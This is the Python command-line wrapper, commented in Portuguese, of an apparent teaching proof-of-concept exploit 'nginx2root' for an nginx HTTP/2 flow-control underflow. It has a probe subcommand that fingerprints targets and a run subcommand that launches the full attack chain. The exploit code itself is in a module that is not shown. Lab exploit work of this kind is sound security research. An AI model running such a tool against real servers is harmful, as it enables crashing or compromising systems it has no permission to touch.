"""CLI do PoC nginx2root.

Exemplos:
    ./n2r probe --host target
    ./n2r run   --host target
    ./n2r run   --host target --accelerate
"""

from __future__ import annotations

import argparse
import sys

from . import banner, attack, ui


def build_parser() -> argparse.ArgumentParser:
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--no-banner", action="store_true",
                        default=argparse.SUPPRESS,
                        help="nao imprime o banner ASCII")

    parser = argparse.ArgumentParser(
        prog="n2r",
        description="PoC didatico do CVE-2026-123007 (nginx HTTP/2 "
                    "flow-control underflow).",
        parents=[common],
    )

    sub = parser.add_subparsers(dest="command", required=True)

    for name, help_text in (
        ("probe", "apenas fingerprint: banner do servidor e ALPN h2"),
        ("run", "executa a cadeia completa de estagios"),
    ):
        p = sub.add_parser(name, help=help_text, parents=[common])
        p.add_argument("--host", required=True, help="host do alvo")
        p.add_argument("--port", type=int, default=8443,
                       help="porta TLS com HTTP/2 (padrao: 8443)")
        if name == "run":
            p.add_argument(
                "--accelerate", action="store_true",
                help="aciona o gancho de aceleracao do laboratorio no "
                     "ultimo estagio (necessario para ver o SIGSEGV)",
            )

    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    if not getattr(args, "no_banner", False):
        banner.render()
        print(ui.grey("Nao aponte para sistemas de terceiros"))
        print()

    try:
        if args.command == "probe":
            attack.probe(args.host, args.port)
            return 0

        return attack.run(args.host, args.port, accelerate=args.accelerate)
    except (OSError, TimeoutError) as exc:
        print()
        ui.bad(f"falha de rede: {exc}")
        ui.note("o alvo esta no ar? rode ./scripts/up.sh")
        return 3


if __name__ == "__main__":
    sys.exit(main())
